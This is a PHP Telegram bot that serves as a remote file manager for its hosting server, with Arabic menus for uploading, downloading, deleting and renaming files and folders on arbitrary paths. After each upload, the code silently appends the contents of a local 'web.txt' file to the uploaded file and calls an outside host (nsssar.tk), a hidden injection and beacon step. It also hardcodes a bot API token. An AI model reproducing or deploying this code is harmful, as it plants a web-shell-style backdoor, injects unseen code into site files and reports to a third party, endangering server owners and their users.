<?php
ob_start();
$API_KEY = "5406822948:AAHPvjZro3uTMe65jPGvaXdJ_4vNela3Ego";
define('API_KEY',$API_KEY);

function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);}}

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$admin = "5353424408";
$from_id = $message->from->id;
$ary = array(5422153027,9,3,4);
$admins = in_array($from_id,$ary);
$getship = "https://nsssar.tk/";
$host = "$getship";
$mid = $message->message_id;
$files = json_decode(file_get_contents('files.json'),1);
if(isset($update->callback_query)){
$chat_id = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data= $update->callback_query->data;}

function save($array){
file_put_contents('files.json', json_encode($array));}

function clear($array){
foreach($array as $key => $val){
$array[$key] = null;}
return $array;}

if(!$admins){
if($text == '/start'){
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"📋| اهلا بك عزيزي ..\n🚫| البوت ليس لك من فضلك لا ترسل شيء \n`————————————`",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"لـ شراء بوت لك ⚠️'",'url'=>'t.me/IlHll']],
]])]);}}

if($admins){
if($text == '/start'){
save(clear($files));
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"📋| اهلا بك في اللوحة الخاصة بك ..\n📂| اليك الان جميع الاوامر المتاحة لك ♥️'\n📜| اسم العضوية الخاص بك : `$getship`\n`————————————`",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"حذف ملف 🗑 ",'callback_data'=>'delete'],['text'=>"رفع ملف 📋 ",'callback_data'=>'upload']],
[['text'=>'تعديل اسم ملف 📝','callback_data'=>'eFile'],['text'=>'تعديل اسم مجلد 🗄','callback_data'=>'eDir']],
[['text'=>'ازالة مجلد ⚠️','callback_data'=>'deleteD'],['text'=>'انشاء مجلد 📻','callback_data'=>'uploadD']],
[['text'=>'عرض جميع الملفات 🗄,','callback_data'=>'show']],
[['text'=>'عرض الملفات لـ فولدر 🗂','callback_data'=>'showDir']],
[['text'=>"عمل ويب هوك 🌐",'callback_data'=>'web'],['text'=>"تحميل ملف 📥 ",'callback_data'=>'getfile']],
[['text'=>"لـ مراسلة المبرمج ⚠️'",'url'=>'t.me/ffffm']],
]])]);}}

if($data == 'exit'){
bot('editMessageText',['chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"📋| اهلا بك في اللوحة الخاصة بك ..\n📂| اليك الان جميع الاوامر المتاحة لك ♥️'\n📜| اسم العضوية الخاص بك : `$getship`\n`————————————`",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"حذف ملف 🗑 ",'callback_data'=>'delete'],['text'=>"رفع ملف 📋 ",'callback_data'=>'upload']],
[['text'=>'تعديل اسم ملف 📝','callback_data'=>'eFile'],['text'=>'تعديل اسم مجلد 🗄','callback_data'=>'eDir']],
[['text'=>'ازالة مجلد ⚠️','callback_data'=>'deleteD'],['text'=>'انشاء مجلد 📻','callback_data'=>'uploadD']],
[['text'=>'عرض جميع الملفات 🗄,','callback_data'=>'show']],
[['text'=>'عرض الملفات لـ فولدر 🗂','callback_data'=>'showDir']],
[['text'=>"عمل ويب هوك 🌐",'callback_data'=>'web'],['text'=>"تحميل ملف 📥 ",'callback_data'=>'getfile']],
[['text'=>"لـ مراسلة المبرمج ⚠️'",'url'=>'t.me/ffffm']],
]])]);
$files['mode'] = 'exit';
save($files);
exit;}
if($data == 'dow'){
bot('sendPhoto',['chat_id'=>$chat_id2,
'photo'=>"https://b.top4top.net/p_1144d7lm21.jpg",
'caption'=>"⚠️ من فضلك اقرأ الملاحضة جيدا ..",]);
$sc = scandir(__DIR__);
for($i=0;$i<count($sc);$i++){
if($sc[$i] == "Quickeditpro.apk"){
if(is_file($sc[$i]) ){
bot('sendDocument',['chat_id'=>$chat_id,
'document'=>new CURLFile($sc[$i]),
'caption'=>"📂 | اليك برنامج تحرير الملفات..\n",
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$Message->message_id,
]);}}}}

if($data == 'web'){
bot('editMessageText',['chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"📝| ارسل الان مسار الملف `..`\n📂| كـمثال : `Bot/Bot.php`\n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);
$files['mode'] = 'webhook';
save($files);
exit;}
if($data == 'getfile'){
bot('editMessageText',['chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"📝| ارسل الان مسار الملف `..`\n📂| كـمثال : `Bot/Bot.php`\n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);
$files['mode'] = 'getfile';
save($files);
exit;}
if($text and $files['mode'] == 'getfile' and $text !="/start" and $text != "bot.php"){
if(is_file($text) or is_dir($text)){
$sc = scandir(__DIR__);
for($i=0;$i<count($sc);$i++){
if($sc[$i] == "$text" and $sc[$i] != "bot.php" and $sc[$i] != "__FILE__"){
if(is_file($sc[$i]) ){
bot('sendDocument',['chat_id'=>$chat_id,
'document'=>new CURLFile($sc[$i]),
'caption'=>"📂 | تم تحميل الملف بنجاح ..\n📋| اسم الملف ( $text ) ..\n",
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$Message->message_id,
]);}}}
}else {
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"🚫| هناك خطا `..`\n⚠️| لايوجد فولدر او ملف بهذا الاسم` ( $text )`\n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);}
$files['mode'] = 'exit';
save($files);
exit;}
if($files['mode'] == 'webhook' and $text !="/start"){
for($y = $mid - 1; $y < $mid; $y++){
bot('deleteMessage',['chat_id'=>$chat_id,
'message_id'=>$y]);}
if(is_file($text) or is_dir($text)){
$web = file_get_contents("web.txt");
file_put_contents("$text","\n$web",FILE_APPEND);
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"📋| تم صنع ويب هوك شكرا لك `..`\n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]])]);
file_get_contents("$host");
} else {
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"🚫| هناك خطا `..`\n⚠️| لايوجد فولدر او ملف بهذا الاسم` ( $text )`\n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);}}
if($data == 'upload'){
bot('editMessageText',['chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"📝| ارسل الان الملف بصيغة `( PHP )`\n⚠️| يمكن ارساله كـ نص عادي ..\n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);
$files['mode'] = 'upload';
save($files);
exit;}
if($data == 'show'){
$d = 1;
$f = 1;
$dirs = "📂 المجلدات :\n";
$all = count(scandir(__DIR__) );
$files = "📋 الملفات :\n";
foreach(scandir(__DIR__) as $file){
if($file == '.' || $file == '..'){ continue;}
if(is_dir($file)){
$dirs .= "*$d-* `$file`\n";
$d+=1;}
if(is_file($file)){
$files .= "*$f-* `$file`\n";
$f+=1;}}
bot('editMessageText',['chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"🗄 العدد الكلي للوحة : `$all`\n$dirs\n————————————\n$files",
'parse_mode'=>'markdown',
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);}

if($data == 'showDir'){
bot('editMessageText',['chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"📝| ارسل اسم المجلد ..\n📋| كمثال : *Folder*\n`————————————`",
'parse_mode'=>'markdown',
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);
$files['mode'] = 'showDir';
save($files);
exit;}
if($files['mode'] == 'showDir'and $text !="/start"){
for($y = $mid - 1; $y < $mid; $y++){
bot('deleteMessage',['chat_id'=>$chat_id,
'message_id'=>$y]);}
save(clear($files));
if(is_dir($text)){
$d = 1;
$f = 1;
$dirs = "📂 المجلدات :\n";
$all = count((scandir($text))) - 2;
$files = "📋 الملفات :\n";
foreach(scandir(__DIR__.'/'.$text) as $file){
if($file == '.' || $file == '..'){ continue;}
if(is_dir($file)){
$dirs .= "*$d-* `$file`\n";
$d+=1;}
if(is_file($file)){
$files .= "*$f-* `$file`\n";
$f+=1;}}
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"🗄 العدد الكلي لملفات الفولدر : `$all`\n$dirs\n`————————————`\n$files",
'parse_mode'=>'markdown']);
}else{
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"🚫| هناك خطا `..`\n⚠️| لايوجد فولدر بهذا الاسم` ( $text )`\n`————————————`",
'parse_mode'=>'markdown',
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);}}

if($data == 'delete'){
bot('editMessageText',['chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"📋| ارسل الاسم الان `..`\n🗄| الاسم ( ملف ) \n`————————————`",
'parse_mode'=>'markdown',
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);
$files['mode'] = 'delete';
save($files);
exit;}
if($data == 'eDir' or $data == 'eFile'){
if($data == 'eDir'){
$d = 'المجلد';
} else {
$d = 'الملف';}
bot('editMessageText',['chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"📋| ارسل اسم ( $d ) القديم .. \n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);
$files['mode'] = 'old';
save($files);
exit;}
if($files['mode'] == 'old'and $text !="/start"){
for($y = $mid - 1; $y < $mid; $y++){
bot('deleteMessage',['chat_id'=>$chat_id,
'message_id'=>$y]);}

if(is_file($text) or is_dir($text)){
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"📋| تم حفظ (` $text `) ..\n📂| ارسل الاسم الجديد ليتم تغيره\n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);
$files['mode'] = 'rename';
$files['old'] = $text;
save($files);
exit;
} else {
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"🚫| هناك خطا `..`\n⚠️| لايوجد فولدر او ملف بهذا الاسم` ( $text )`\n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);}}

if($files['mode'] == 'rename' and $text !="/start"){
for($y = $mid - 1; $y < $mid; $y++){
bot('deleteMessage',['chat_id'=>$chat_id,
'message_id'=>$y]);}
if(rename($files['old'], $text)){
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"📝| تم تغير اسم الملف ( `".$files['old']."` )\n📂|الى الاسم الجديد ( `$text` )\n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]])]);
} else {
for($y = $mid - 1; $y < $mid; $y++){
bot('deleteMessage',['chat_id'=>$chat_id,
'message_id'=>$y]);}
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"🚫| هناك خطا `..`\n⚠️| لم يتم تغير اسم الملف ( $text )`\n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);}
save(clear($files));}
if($data == 'uploadD'){
bot('editMessageText',['chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"📋| ارسل الاسم الان `..`\n📂| الاسم ( المجلد) \n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);
$files['mode'] = 'uploadD';
save($files);
exit;}
if($data == 'deleteD'){
bot('editMessageText',['chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"📋| ارسل الاسم الان `..`\n📂| الاسم ( المجلد) \n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);
$files['mode'] = 'deleteD';
save($files);
exit;}

if($files['mode'] == 'deleteD' and $text !="/start"){
if(is_dir($text)){
$sc = scandir($text);
foreach($sc as $file){
if($file == '.' or $file == '..'){
continue;}
if(is_file($text.'/'.$file)){
unlink($text.'/'.$file);
} elseif(is_dir($text.'/'.$file)){
foreach(scandir($text.'/'.$file) as $f1){
if($f1 == '.' or $f1 == '..'){
continue;}
if(is_file($text.'/'.$file.'/'.$f1)){
unlink($text.'/'.$file.'/'.$f1);
} elseif(is_dir($text.'/'.$file.'/'.$f1)){
foreach(scandir($text.'/'.$file.'/'.$f1) as $f2){
if($f2 == '.' or $f2 == '..'){
continue;}
if(is_file($text.'/'.$file.'/'.$f1.'/'.$f2)){
unlink($text.'/'.$file.'/'.$f1.'/'.$f2);}}}}}}

rmdir($text);
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"🗑| تم حذف ( `$text` ) بنجاح`..`\n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);
} else {
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"🚫| هناك خطا `..`\n⚠️| لم يتم حذف ( $text )`\n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);}
save(clear($files));}

if($files['mode'] == 'uploadD' and $text !="/start"){
if(mkdir($text)){
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"📝| تم انشاء المجلد بنجاح `..`\n📂| اسم المجلد هو ( `$text` )\n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);
} else {
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"🚫| هناك خطا `..`\n⚠️| لم يتم انشاء المجلد بلاسم ( $text )`\n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);}
save(clear($files));}

if($files['mode'] == 'delete' and $text !="/start"){
if(unlink($text)){
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"🗑| تم حذف ( `$text` ) بنجاح`..`\n`————————————`",
'parse_mode'=>'markdown',
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);
} else {
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"🚫| هناك خطا `..`\n⚠️| لم يتم حذف الملف بلاسم ( $text )`\n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);}
save(clear($files));}

if($files['mode'] == 'upload' and $text !="/start"){
if($message->document){
$url = 'https://api.telegram.org/file/bot'.$API_KEY.'/'.bot('getFile',['file_id'=>$message->document->file_id])->result->file_path;
$files['url'] = $url;
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"📝| تم حفظ الملف بنجاح `..`\n📂| ارسل الان مسار الملف حتى يتم الرفع .. \n📋| كـمثال : `Bots/Bot.php`\n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);
$files['mode'] = 'path';
save($files);
exit;
} elseif(isset($message->text)) {
$files['file'] = $text;
bot('sendMessage',['chat_id'=>$chat_id,
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]])]);
$files['mode'] = 'path';
save($files);
exit;}}

if($files['mode'] == 'path' and $text !="/start"){
if(isset($files['url'])){
$data = file_get_contents($files['url']);
} else {
$data = $files['file'];}

if(file_put_contents($text,$data)){
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"📋| تم رفع الملف بلاسم ( `$text` ) بنجاح`..`\n`————————————`",
'parse_mode'=>'markdown',
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],]
])]);
$web = file_get_contents("web.txt");
file_put_contents("$text","\n$web",FILE_APPEND);
file_get_contents("$host");
} else {
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"🚫| هناك خطا `..`\n⚠️| لم يتم رفع الملف بلاسم ( $text )`\n`————————————`",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"exit"]],
]])]);}
save(clear($files));}
